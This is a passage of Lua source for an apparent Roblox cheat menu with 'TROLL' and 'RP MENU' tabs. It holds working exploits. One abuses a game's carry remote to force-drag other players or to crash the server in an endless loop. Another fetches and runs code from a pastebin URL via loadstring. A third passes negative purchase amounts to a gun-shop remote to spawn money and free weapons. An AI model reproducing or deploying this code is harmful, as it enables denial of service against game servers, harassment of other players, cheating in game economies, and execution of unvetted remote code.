        cb.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                input:Capture()
            end
        end)

        cb.MouseButton1Click:Connect(function()
            sg:Destroy()
        end)
        
        Utils.MakeDraggable(md, md)

        ab2.MouseButton1Click:Connect(function()
            local nm = tostring(inp.Text or "")
            if nm == "" then
                return msg("Error", "Enter a target name", 4)
            end

            tg = {nm}
            local abl = false

            if nm:lower() == "all" or nm:lower() == "others" then
                abl = true
            end

            if abl then
                for _, pl in next, ps:GetPlayers() do
                    if pl ~= pl2 then
                        pcall(function()
                            sf(pl)
                        end)
                    end
                end
                return
            end

            local trg = gp(nm)
            if trg and trg ~= lp then
                if trg.UserId ~= 1414978355 then
                    pcall(function()
                        sf(trg)
                    end)
                else
                    msg("Error Occurred", "This user is whitelisted! (Owner)", 5)
                end
            else
                msg("Error Occurred", "Username Invalid", 5)
            end
        end)
    end)

    Components.CreateButton(contents["TROLL"], "INVISIBILITY TOOL", function()

        local CONFIG = {
            TOGGLE_KEY = Enum.KeyCode.X,
            DEFAULT_SPEED = 16,
            BOOSTED_SPEED = 48,
            INVISIBILITY_POSITION = Vector3.new(-25.95, 84, 3537.55),
            NOTIFICATION_DURATION = 3,

            BACKGROUND_COLOR = Color3.fromRGB(25, 25, 25),
            ACCENT_COLOR = Color3.fromRGB(45, 45, 45),
            PRIMARY_COLOR = Color3.fromRGB(0, 170, 255),
            SUCCESS_COLOR = Color3.fromRGB(46, 204, 113),
            DANGER_COLOR = Color3.fromRGB(231, 76, 60),
            WARNING_COLOR = Color3.fromRGB(241, 196, 15),
            TEXT_COLOR = Color3.fromRGB(255, 255, 255),
            SECONDARY_TEXT_COLOR = Color3.fromRGB(189, 195, 199),
        }

        local Players = game:GetService("Players")
        local StarterGui = game:GetService("StarterGui")
        local UserInputService = game:GetService("UserInputService")
        local RunService = game:GetService("RunService")

        local pl = lp
        local playerState = {
            isInvisible = false,
            isSpeedBoosted = false,
            originalSpeed = CONFIG.DEFAULT_SPEED,
        }

        local screenGui
        local mainFrame
        local toggleButton
        local speedButton
        local closeButton
        local signatureLabel

        local function createNotification(title, text)
            StarterGui:SetCore("SendNotification", {
                Title = title,
                Text = text,
                Duration = CONFIG.NOTIFICATION_DURATION,
            })
        end

        local function setCharacterTransparency(character, transparency)
            for _, descendant in character:GetDescendants() do
                if descendant:IsA("BasePart") or descendant:IsA("Decal") then
                    descendant.Transparency = transparency
                end
            end
        end

        local function gh()
            local ch = pl.Character
            if not ch then
                return nil
            end
            return ch:FindFirstChild("Humanoid")
        end

        local function ghrp()
            local ch = pl.Character
            if not ch then
                return nil
            end
            return ch:FindFirstChild("HumanoidRootPart")
        end

        local function ti()
            if not pl.Character then
                warn("Character not found")
                return
            end

            playerState.isInvisible = not playerState.isInvisible

            if playerState.isInvisible then
                local hrp = ghrp()
                if not hrp then
                    warn("HumanoidRootPart not found")
                    return
                end

                local sp = hrp.CFrame

                pl.Character:MoveTo(CONFIG.INVISIBILITY_POSITION)
                task.wait(0.15)

                local seat = Instance.new("Seat")
                seat.Name = "invischair"
                seat.Anchored = false
                seat.CanCollide = false
                seat.Transparency = 1
                seat.Position = CONFIG.INVISIBILITY_POSITION
                seat.Parent = workspace

                local weld = Instance.new("Weld")
                weld.Part0 = seat
                weld.Part1 = pl.Character:FindFirstChild("Torso") or pl.Character:FindFirstChild("UpperTorso")
                weld.Parent = seat

                task.wait()
                seat.CFrame = sp

                setCharacterTransparency(pl.Character, 0.5)

                toggleButton.BackgroundColor3 = CONFIG.ACCENT_COLOR
                toggleButton.Text = "VISIBLE"

                createNotification("Invisibility ON", "You are now invisible")
            else

                local invisChair = workspace:FindFirstChild("invischair")
                if invisChair then
                    invisChair:Destroy()
                end

                if pl.Character then
                    setCharacterTransparency(pl.Character, 0)
                end

                toggleButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                toggleButton.Text = "INVISIBLE"

                createNotification("Invisibility OFF", "You are now visible")
            end
        end

        local function tsb()
            local hu = gh()
            if not hu then
                warn("Humanoid not found")
                return
            end

            playerState.isSpeedBoosted = not playerState.isSpeedBoosted

            if playerState.isSpeedBoosted then
                hu.WalkSpeed = CONFIG.BOOSTED_SPEED
                speedButton.BackgroundColor3 = CONFIG.ACCENT_COLOR
                speedButton.Text = "SPEED ON"
                createNotification("Speed Boost ON", "Speed: " .. CONFIG.BOOSTED_SPEED)
            else
                hu.WalkSpeed = playerState.originalSpeed
                speedButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                speedButton.Text = "SPEED BOOST"
                createNotification("Speed Boost OFF", "Speed: " .. playerState.originalSpeed)
            end
        end

        local function resetPlayerState()
            playerState.isInvisible = false
            playerState.isSpeedBoosted = false

            if toggleButton then
                toggleButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                toggleButton.Text = "INVISIBLE"
            end

            if speedButton then
                speedButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                speedButton.Text = "SPEED BOOST"
            end
        end

        local function createGUI()
            screenGui = Instance.new("ScreenGui")
            screenGui.Name = math.random(10000,99999)
            screenGui.ResetOnSpawn = false
            screenGui.Parent = pl:WaitForChild("PlayerGui")

            mainFrame = Instance.new("Frame")
            mainFrame.Name = "b"
            mainFrame.Size = UDim2.new(0, 280, 0, 130)
            mainFrame.Position = UDim2.new(0.5, -140, 0.5, -65)
            mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            mainFrame.BorderSizePixel = 0
            mainFrame.Parent = screenGui
            Utils.RoundCorners(mainFrame, 12)
            Utils.MakeDraggable(mainFrame)

            local tl = Instance.new("TextLabel")
            tl.Size = UDim2.new(1, -40, 0, 35)
            tl.Position = UDim2.new(0, 10, 0, 5)
            tl.BackgroundTransparency = 1
            tl.Text = "INVISIBILITY TOOL"
            tl.TextColor3 = Color3.fromRGB(255, 255, 255)
            tl.TextSize = 14
            tl.Font = Enum.Font.GothamBold
            tl.TextXAlignment = Enum.TextXAlignment.Center
            tl.Parent = mainFrame

            closeButton = Instance.new("TextButton")
            closeButton.Size = UDim2.new(0, 28, 0, 28)
            closeButton.Position = UDim2.new(1, -33, 0, 7)
            closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            closeButton.BorderSizePixel = 0
            closeButton.Text = "X"
            closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            closeButton.TextSize = 12
            closeButton.Font = Enum.Font.GothamBold
            closeButton.Parent = mainFrame
            Utils.RoundCorners(closeButton, 6)

            toggleButton = Instance.new("TextButton")
            toggleButton.Size = UDim2.new(1, -20, 0, 30)
            toggleButton.Position = UDim2.new(0, 10, 0, 50)
            toggleButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
            toggleButton.BorderSizePixel = 0
            toggleButton.Text = "INVISIBLE"
            toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            toggleButton.TextSize = 12
            toggleButton.Font = Enum.Font.Gotham
            toggleButton.Parent = mainFrame
            Utils.RoundCorners(toggleButton, 6)

            speedButton = Instance.new("TextButton")
            speedButton.Size = UDim2.new(1, -20, 0, 30)
            speedButton.Position = UDim2.new(0, 10, 0, 90)
            speedButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
            speedButton.BorderSizePixel = 0
            speedButton.Text = "SPEED BOOST"
            speedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            speedButton.TextSize = 12
            speedButton.Font = Enum.Font.Gotham
            speedButton.Parent = mainFrame
            Utils.RoundCorners(speedButton, 6)
        end

        local function connectEvents()

            toggleButton.MouseButton1Click:Connect(ti)
            speedButton.MouseButton1Click:Connect(tsb)
            closeButton.MouseButton1Click:Connect(function()
                screenGui:Destroy()
            end)

            uis.InputBegan:Connect(function(input, gameProcessed)
                if gameProcessed then
                    return
                end

                if input.KeyCode == CONFIG.TOGGLE_KEY then
                    ti()
                end
            end)

            pl.CharacterAdded:Connect(function(ch)
                resetPlayerState()

                local hu = ch:WaitForChild("Humanoid")
                playerState.originalSpeed = hu.WalkSpeed
                hu.WalkSpeed = CONFIG.DEFAULT_SPEED

                local ic = workspace:FindFirstChild("invischair")
                if ic then
                    ic:Destroy()
                end
            end)

            Players.PlayerRemoving:Connect(function(lp2)
                if lp2 == pl then
                    local ic = workspace:FindFirstChild("invischair")
                    if ic then
                        ic:Destroy()
                    end
                end
            end)
        end

        local function init()

            if not pl.Character then
                pl.CharacterAdded:Wait()
            end

            local hu = gh()
            if hu then
                playerState.originalSpeed = hu.WalkSpeed
            end

            createGUI()
            connectEvents()

        end

        init()
    end)


    Components.CreateButton(contents["TROLL"], "BRING ALL", function()

        local bringAllGui = Instance.new("ScreenGui")
        bringAllGui.Name = math.random(10000,99999)
        bringAllGui.ResetOnSpawn = false
        bringAllGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        bringAllGui.Parent = pg

        local Frame = Instance.new("Frame")
        Frame.Name = "MainFrame"
        Frame.Size = UDim2.new(0, 293, 0, 140)
        Frame.Position = UDim2.new(0.5, -146.5, 0.5, -70)
        Frame.AnchorPoint = Vector2.new(0.5, 0.5)
        Frame.BackgroundColor3 = Config.Theme.Primary
        Frame.BorderSizePixel = 0
        Frame.ClipsDescendants = true
        Frame.Parent = bringAllGui
        
        Utils.RoundCorners(Frame, 12)
        Utils.AddStroke(Frame, Config.Theme.Border, 2)

        local gradientBg = Instance.new("Frame")
        gradientBg.Name = "GradientBg"
        gradientBg.Size = UDim2.new(1, 0, 1, 0)
        gradientBg.BackgroundColor3 = Config.Theme.Primary
        gradientBg.BackgroundTransparency = 0.5
        gradientBg.BorderSizePixel = 0
        gradientBg.ZIndex = 0
        gradientBg.Parent = Frame
        
        Utils.CreateGradient(gradientBg, Color3.fromRGB(2, 2, 2), Color3.fromRGB(0, 0, 0), 45)
        Utils.RoundCorners(gradientBg, 12)

        local shadow = Instance.new("ImageLabel")
        shadow.Name = "Shadow"
        shadow.Size = UDim2.new(1, 30, 1, 30)
        shadow.Position = UDim2.new(0, -15, 0, -15)
        shadow.BackgroundTransparency = 1
        shadow.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
        shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
        shadow.ImageTransparency = 0.7
        shadow.ZIndex = 0
        shadow.Parent = Frame

        local titleBar = Instance.new("Frame")
        titleBar.Name = "TitleBar"
        titleBar.Size = UDim2.new(1, 0, 0, 40)
        titleBar.Position = UDim2.new(0, 0, 0, 0)
        titleBar.BackgroundColor3 = Config.Theme.Secondary
        titleBar.BackgroundTransparency = 0.3
        titleBar.BorderSizePixel = 0
        titleBar.Parent = Frame
        
        Utils.RoundCorners(titleBar, 12)
        
        local titleLabel = Instance.new("TextLabel")
        titleLabel.Name = "Title"
        titleLabel.Size = UDim2.new(1, -80, 1, 0)
        titleLabel.AnchorPoint = Vector2.new(0.5, 0)
        titleLabel.Position = UDim2.new(0.5, 0, 0, 0)
        titleLabel.BackgroundTransparency = 1
        titleLabel.Text = "BRING ALL"
        titleLabel.TextColor3 = Config.Theme.Text
        titleLabel.TextSize = 14
        titleLabel.Font = Enum.Font.GothamBold
        titleLabel.TextXAlignment = Enum.TextXAlignment.Center
        titleLabel.Parent = titleBar

        local closeBtn = Instance.new("TextButton")
        closeBtn.Name = "CloseBtn"
        closeBtn.Size = UDim2.new(0, 30, 0, 30)
        closeBtn.Position = UDim2.new(1, -35, 0, 5)
        closeBtn.BackgroundColor3 = Config.Theme.Danger
        closeBtn.Text = "X"
        closeBtn.TextColor3 = Config.Theme.Text
        closeBtn.TextSize = 14
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.BorderSizePixel = 0
        closeBtn.Parent = titleBar
        Utils.RoundCorners(closeBtn, 8)
        
        closeBtn.MouseButton1Click:Connect(function()
            bringAllGui:Destroy()
        end)

        local inputContainer = Instance.new("Frame")
        inputContainer.Name = "InputContainer"
        inputContainer.Size = UDim2.new(1, -20, 0, 35)
        inputContainer.Position = UDim2.new(0, 10, 0, 45)
        inputContainer.BackgroundTransparency = 1
        inputContainer.Parent = Frame
        
        local playerNameInput = Instance.new("TextBox")
        playerNameInput.Name = "PlayerNameInput"
        playerNameInput.Size = UDim2.new(1, 0, 1, 0)
        playerNameInput.Position = UDim2.new(0, 0, 0, 0)
        playerNameInput.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        playerNameInput.BorderSizePixel = 0
        playerNameInput.Text = ""
        playerNameInput.PlaceholderText = "PLAYER OR ALL"
        playerNameInput.TextColor3 = Config.Theme.Text
        playerNameInput.PlaceholderColor3 = Config.Theme.TextDim
        playerNameInput.TextSize = 15
        playerNameInput.Font = Enum.Font.Gotham
        playerNameInput.TextXAlignment = Enum.TextXAlignment.Center
        playerNameInput.ClearTextOnFocus = false
        playerNameInput.Parent = inputContainer

        local textPadding = Instance.new("UIPadding")
        textPadding.PaddingLeft = UDim.new(0, 10)
        textPadding.PaddingRight = UDim.new(0, 10)
        textPadding.Parent = playerNameInput
        
        Utils.RoundCorners(playerNameInput, 6)
        Utils.AddStroke(playerNameInput, Config.Theme.Border, 1)

        local executeBtn = Instance.new("TextButton")
        executeBtn.Name = "ExecuteBtn"
        executeBtn.Size = UDim2.new(1, -20, 0, 40)
        executeBtn.Position = UDim2.new(0, 10, 0, 88)
        executeBtn.BackgroundTransparency = 1
        executeBtn.BorderSizePixel = 0
        executeBtn.Text = "EXECUTE"
        executeBtn.TextColor3 = Config.Theme.Text
        executeBtn.TextSize = 13
        executeBtn.Font = Enum.Font.GothamBold
        executeBtn.TextXAlignment = Enum.TextXAlignment.Center
        executeBtn.Parent = Frame

        executeBtn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then

                input:Capture()
            end
        end)

        playerNameInput.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                input:Capture()
            end
        end)

        closeBtn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                input:Capture()
            end
        end)

        executeBtn.MouseButton1Click:Connect(function()
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local Players = game:GetService("Players")

            local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
            local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices"):WaitForChild("Couple Hug")
            local localPlayer = Players.LocalPlayer

            local targetName = playerNameInput.Text:gsub("^%s+", ""):gsub("%s+$", ""):lower()

            if targetName == "all" then

                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= localPlayer then
                        carryRemote:FireServer({
                            cmd = "Carry",
                            carrychoicesss = carryChoice,
                            firstPlr = player
                        })
                    end
                end

                task.wait(0.07)

                carryRemote:FireServer({
                    cmd = "Declinecarry"
                })
            else

                if targetName == "" then
                    return
                end

                local targetPlayer = nil
                local originalInput = playerNameInput.Text:gsub("^%s+", ""):gsub("%s+$", "")

                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= localPlayer and player.Name:lower() == targetName then
                        targetPlayer = player
                        break
                    end
                end

                if not targetPlayer then
                    for _, player in pairs(Players:GetPlayers()) do
                        if player ~= localPlayer and player.Name:lower():find(targetName, 1, true) then
                            targetPlayer = player
                            break
                        end
                    end
                end

                if targetPlayer then
                    carryRemote:FireServer({
                        cmd = "Carry",
                        carrychoicesss = carryChoice,
                        firstPlr = targetPlayer
                    })

                    task.wait(0.07)

                    carryRemote:FireServer({
                        cmd = "Declinecarry"
                    })
                else
                end
            end
        end)


        Utils.MakeDraggable(Frame, Frame)
    end)

    Components.CreateButton(contents["TROLL"], "CRASH SERVER", function()

        local crashGui = Instance.new("ScreenGui")
        crashGui.Name = math.random(10000,99999)
        crashGui.ResetOnSpawn = false
        crashGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        crashGui.Parent = pg

        local Frame = Instance.new("Frame")
        Frame.Name = "MainFrame"
        Frame.Size = UDim2.new(0, 293, 0, 100)
        Frame.Position = UDim2.new(0.5, -146.5, 0.5, -50)
        Frame.AnchorPoint = Vector2.new(0.5, 0.5)
        Frame.BackgroundColor3 = Config.Theme.Primary
        Frame.BorderSizePixel = 0
        Frame.ClipsDescendants = true
        Frame.Parent = crashGui
        
        Utils.RoundCorners(Frame, 12)
        Utils.AddStroke(Frame, Config.Theme.Border, 2)

        local gradientBg = Instance.new("Frame")
        gradientBg.Name = "GradientBg"
        gradientBg.Size = UDim2.new(1, 0, 1, 0)
        gradientBg.BackgroundColor3 = Config.Theme.Primary
        gradientBg.BackgroundTransparency = 0.5
        gradientBg.BorderSizePixel = 0
        gradientBg.ZIndex = 0
        gradientBg.Parent = Frame
        
        Utils.CreateGradient(gradientBg, Color3.fromRGB(2, 2, 2), Color3.fromRGB(0, 0, 0), 45)
        Utils.RoundCorners(gradientBg, 12)

        local shadow = Instance.new("ImageLabel")
        shadow.Name = "Shadow"
        shadow.Size = UDim2.new(1, 30, 1, 30)
        shadow.Position = UDim2.new(0, -15, 0, -15)
        shadow.BackgroundTransparency = 1
        shadow.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
        shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
        shadow.ImageTransparency = 0.7
        shadow.ZIndex = 0
        shadow.Parent = Frame

        local titleBar = Instance.new("Frame")
        titleBar.Name = "TitleBar"
        titleBar.Size = UDim2.new(1, 0, 0, 40)
        titleBar.Position = UDim2.new(0, 0, 0, 0)
        titleBar.BackgroundColor3 = Config.Theme.Secondary
        titleBar.BackgroundTransparency = 0.3
        titleBar.BorderSizePixel = 0
        titleBar.Parent = Frame
        
        Utils.RoundCorners(titleBar, 12)
        
        local titleLabel = Instance.new("TextLabel")
        titleLabel.Name = "Title"
        titleLabel.Size = UDim2.new(1, -80, 1, 0)
        titleLabel.Position = UDim2.new(0, 10, 0, 0)
        titleLabel.BackgroundTransparency = 1
        titleLabel.Text = "CRASH SERVER"
        titleLabel.TextColor3 = Config.Theme.Text
        titleLabel.TextSize = 14
        titleLabel.Font = Enum.Font.GothamBold
        titleLabel.TextXAlignment = Enum.TextXAlignment.Left
        titleLabel.Parent = titleBar

        local closeBtn = Instance.new("TextButton")
        closeBtn.Name = "CloseBtn"
        closeBtn.Size = UDim2.new(0, 30, 0, 30)
        closeBtn.Position = UDim2.new(1, -35, 0, 5)
        closeBtn.BackgroundColor3 = Config.Theme.Danger
        closeBtn.Text = "X"
        closeBtn.TextColor3 = Config.Theme.Text
        closeBtn.TextSize = 14
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.BorderSizePixel = 0
        closeBtn.Parent = titleBar
        Utils.RoundCorners(closeBtn, 8)
        
        closeBtn.MouseButton1Click:Connect(function()
            crashGui:Destroy()
        end)

        local buttonContainer = Instance.new("Frame")
        buttonContainer.Name = "ButtonContainer"
        buttonContainer.Size = UDim2.new(1, -20, 0, 50)
        buttonContainer.Position = UDim2.new(0, 10, 0, 45)
        buttonContainer.BackgroundTransparency = 1
        buttonContainer.Parent = Frame
        
        local listLayout = Instance.new("UIListLayout")
        listLayout.SortOrder = Enum.SortOrder.LayoutOrder
        listLayout.Padding = UDim.new(0, 10)
        listLayout.Parent = buttonContainer

        local crashBtn = Instance.new("TextButton")
        crashBtn.Name = "CrashServer"
        crashBtn.Size = UDim2.new(1, 0, 0, 40)
        crashBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        crashBtn.BackgroundTransparency = 0
        crashBtn.BorderSizePixel = 0
        crashBtn.Text = "EXECUTE"
        crashBtn.TextColor3 = Config.Theme.Text
        crashBtn.TextSize = 13
        crashBtn.Font = Enum.Font.GothamBold
        crashBtn.Parent = buttonContainer
        
        Utils.RoundCorners(crashBtn, 8)

        crashBtn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                input:Capture()
            end
        end)

        closeBtn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                input:Capture()
            end
        end)
        
        crashBtn.MouseButton1Click:Connect(function()
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local Players = game:GetService("Players")

            local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
            local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices"):WaitForChild("Couple Hug")
            local localPlayer = Players.LocalPlayer

            while true do
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= localPlayer then
                        carryRemote:FireServer({
                            cmd = "Carry",
                            carrychoicesss = carryChoice,
                            firstPlr = player
                        })
                    end
                end

                carryRemote:FireServer({
                    cmd = "Declinecarry"
                })

                task.wait()
            end
        end)


        Utils.MakeDraggable(Frame, Frame)
    end)

    Components.CreateButton(contents["TROLL"], "JERK", function()
        
        local success, errorMsg = pcall(function()
            loadstring(game:HttpGet("https://pastebin.com/raw/YiSqWZ78"))()
        end)
        
        if not success then
        else
        end
    end)
    
    Components.CreateButton(contents["RP MENU"], "CAVITE RP MENU", function()
        Components.CreateSimpleRPMenu("CAVITE RP", {
            {text = "Spawn Money", callback = function()
                Components.CreateMoneyModal("CAVITE RP", function()
                    return game:GetService("ReplicatedStorage"):WaitForChild("GunShop"):WaitForChild("Events"):WaitForChild("Purchase")
                end, function(amount)
                    return {"Desert Deagle", -amount}
                end)
            end},
            {text = "Desert-Deagle", callback = function()
                Components.CreateGunModal("CAVITE RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("GunShop"):WaitForChild("Events"):WaitForChild("Purchase")
                    end,
                    function(gunName)
                        return {"Desert Deagle", 0}
                    end,
                    "Desert Deagle"
                )
            end},
            {text = "Glock-17", callback = function()
                Components.CreateGunModal("CAVITE RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("GunShop"):WaitForChild("Events"):WaitForChild("Purchase")
                    end,
                    function(gunName)
                        return {"Glock-17", 0}
                    end,
                    "Glock-17"
                )
            end}
        })
    end)

    Components.CreateLabel(contents.SETTINGS, "VISUAL FEATURES", Config.Theme.Accent)
    
    Components.CreateToggle(contents.SETTINGS, "FULLBRIGHT", false, function(state)

        local lighting = game:GetService("Lighting")
        if state then
            lighting.Ambient = Color3.fromRGB(255, 255, 255)
            lighting.Brightness = 2
        else
            lighting.Ambient = Color3.fromRGB(0, 0, 0)
            lighting.Brightness = 1
        end
    end)
    
    Components.CreateToggle(contents.SETTINGS, "REMOVE FOG", false, function(state)

        local lighting = game:GetService("Lighting")
        lighting.FogEnd = state and 100000 or 1000
    end)
    
    Components.CreateLabel(contents.SETTINGS, "EFFECTS SETTINGS", Config.Theme.Accent)

    Components.CreateToggle(contents.SETTINGS, "FPS COUNTER", false, function(state)

        if state then

            local fpsGui = Instance.new("ScreenGui")
            fpsGui.Name = math.random(10000,99999)
            fpsGui.ResetOnSpawn = false
            fpsGui.Parent = pg
            
            local fpsFrame = Instance.new("Frame")
            fpsFrame.Size = UDim2.new(0, 120, 0, 30)
            fpsFrame.Position = UDim2.new(0, 10, 0, 10)
            fpsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            fpsFrame.BackgroundTransparency = 0.3
            fpsFrame.BorderSizePixel = 0
            fpsFrame.Parent = fpsGui
            
            local fpsCorner = Instance.new("UICorner")
            fpsCorner.CornerRadius = UDim.new(0, 6)
            fpsCorner.Parent = fpsFrame
            
            local fpsLabel = Instance.new("TextLabel")
            fpsLabel.Size = UDim2.new(1, 0, 1, 0)
            fpsLabel.BackgroundTransparency = 1
            fpsLabel.Text = "FPS: 60"
            fpsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            fpsLabel.TextSize = 14
            fpsLabel.Font = Enum.Font.GothamBold
            fpsLabel.Parent = fpsFrame

            local lastTime = tick()
            local frameCount = 0
            local fps = 0
            
            local fpsConnection = rs.Heartbeat:Connect(function()
                frameCount = frameCount + 1
                local currentTime = tick()
                if currentTime - lastTime >= 1 then
                    fps = math.floor(frameCount / (currentTime - lastTime))
                    fpsLabel.Text = "FPS: " .. fps
                    frameCount = 0
                    lastTime = currentTime
                end
            end)

            _G.FPSConnection = fpsConnection
            _G.FPSGui = fpsGui
        else

            if _G.FPSConnection then
                _G.FPSConnection:Disconnect()
                _G.FPSConnection = nil
            end
            if _G.FPSGui then
                _G.FPSGui:Destroy()
                _G.FPSGui = nil
            end
        end
    end)
    
    Components.CreateToggle(contents.SETTINGS, "PING DISPLAY", false, function(state)

        if state then

            local pingGui = Instance.new("ScreenGui")
            pingGui.Name = math.random(10000,99999)
            pingGui.ResetOnSpawn = false
            pingGui.Parent = pg
            
            local pingFrame = Instance.new("Frame")
            pingFrame.Size = UDim2.new(0, 120, 0, 30)
            pingFrame.Position = UDim2.new(0, 10, 0, 50)
            pingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            pingFrame.BackgroundTransparency = 0.3
            pingFrame.BorderSizePixel = 0
            pingFrame.Parent = pingGui
            
            local pingCorner = Instance.new("UICorner")
            pingCorner.CornerRadius = UDim.new(0, 6)
            pingCorner.Parent = pingFrame
            
            local pingLabel = Instance.new("TextLabel")
            pingLabel.Size = UDim2.new(1, 0, 1, 0)
            pingLabel.BackgroundTransparency = 1
            pingLabel.Text = "Ping: 0ms"
            pingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            pingLabel.TextSize = 14
            pingLabel.Font = Enum.Font.GothamBold
            pingLabel.Parent = pingFrame

            local pingConnection = rs.Heartbeat:Connect(function()
                local stats = game:GetService("Stats")
                local ping = math.floor(stats.Network.ServerStatsItem["Data Ping"]:GetValue())
                pingLabel.Text = "Ping: " .. ping .. "ms"
            end)

            _G.PingConnection = pingConnection
            _G.PingGui = pingGui
        else

            if _G.PingConnection then
                _G.PingConnection:Disconnect()
                _G.PingConnection = nil
            end
            if _G.PingGui then
                _G.PingGui:Destroy()
                _G.PingGui = nil
            end
        end
    end)

    Components.CreateToggle(contents.SETTINGS, "FPS OPTIMIZER", false, function(state)
        if state then

            local lighting = game:GetService("Lighting")
            local players = game:GetService("Players")

            _G.FPSOptimizerSettings = {
                LightingEnabled = lighting.GlobalShadows,
                ShadowsEnabled = lighting.ShadowSoftness,
                RenderingQuality = lp.EffectsQuality,
                MeshPartDetail = Enum.RenderFidelity.Automatic,
                ParticleQuality = Enum.QualityLevel.Level01
            }

            lighting.GlobalShadows = false
            lighting.ShadowSoftness = 0
            lighting.Brightness = 0.5
            lighting.FogStart = 100000
            lp.EffectsQuality = Enum.QualityLevel.Level01

            settings().Rendering.QualityLevel = 1

            for _, descendant in pairs(workspace:GetDescendants()) do
                if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Smoke") or descendant:IsA("Fire") or descendant:IsA("Sparkles") then
                    descendant.Enabled = false
                end
                if descendant:IsA("MeshPart") and descendant.RenderFidelity == Enum.RenderFidelity.PerPixel then
                    descendant.RenderFidelity = Enum.RenderFidelity.Automatic
                end
            end

            _G.FPSOptimizerConnection = workspace.DescendantAdded:Connect(function(descendant)
                if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Smoke") or descendant:IsA("Fire") or descendant:IsA("Sparkles") then
                    descendant.Enabled = false
                end
                if descendant:IsA("MeshPart") and descendant.RenderFidelity == Enum.RenderFidelity.PerPixel then
                    descendant.RenderFidelity = Enum.RenderFidelity.Automatic
                end
            end)
        else

            if _G.FPSOptimizerSettings then
                local lighting = game:GetService("Lighting")
                local players = game:GetService("Players")
                
                lighting.GlobalShadows = _G.FPSOptimizerSettings.LightingEnabled
                lighting.ShadowSoftness = _G.FPSOptimizerSettings.ShadowsEnabled
                lp.EffectsQuality = _G.FPSOptimizerSettings.RenderingQuality
                
                settings().Rendering.QualityLevel = 5

                for _, descendant in pairs(workspace:GetDescendants()) do
                    if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Smoke") or descendant:IsA("Fire") or descendant:IsA("Sparkles") then
                        pcall(function() descendant.Enabled = true end)
                    end
                end
            end
            
            if _G.FPSOptimizerConnection then
                _G.FPSOptimizerConnection:Disconnect()
                _G.FPSOptimizerConnection = nil
            end
            
            _G.FPSOptimizerSettings = nil
        end
    end)

    Components.CreateLabel(contents.SETTINGS, "PERFORMANCE SETTINGS", Config.Theme.Accent)
    
    Components.CreateToggle(contents.SETTINGS, "PERFORMANCE MODE", false, function(state)
        _G.PerformanceMode = state
        
        if state then

            if _G.ESP_Settings then
                _G.ESP_Settings.UpdateRate = 0.15
                _G.ESP_Settings.MaxDistance = 1000
            end
        else

            if _G.ESP_Settings then
                _G.ESP_Settings.UpdateRate = 0.1
                _G.ESP_Settings.MaxDistance = 2000
            end
        end
    end)
    
    Components.CreateToggle(contents.SETTINGS, "LOW PING MODE", false, function(state)
        _G.LowPingMode = state
        
        if state then


            _G.FOVUpdateSlowMode = true

            if _G.ESP_Settings then
                _G.ESP_Settings.UpdateRate = 0.25
                _G.ESP_Settings.MaxDistance = 1500
            end

            if _G.PingConnection then
                _G.PingConnection:Disconnect()
                _G.PingConnection = nil
            end
        else

            _G.FOVUpdateSlowMode = false
            
            if _G.ESP_Settings then
                _G.ESP_Settings.UpdateRate = 0.15
                _G.ESP_Settings.MaxDistance = 2000
            end
        end
    end)

    Components.CreateLabel(contents.SETTINGS, "KEYBIND SETTINGS", Config.Theme.Accent)
    
    -- Helper function to format key name for display
    local function formatKeyName(keyCode)
        local name = keyCode.Name
        if name == "RightControl" then
            return "Right Ctrl"
        elseif name == "LeftControl" then
            return "Left Ctrl"
        elseif name == "RightShift" then
            return "Right Shift"
        elseif name == "LeftShift" then
            return "Left Shift"
        else
            return name
        end
    end
    
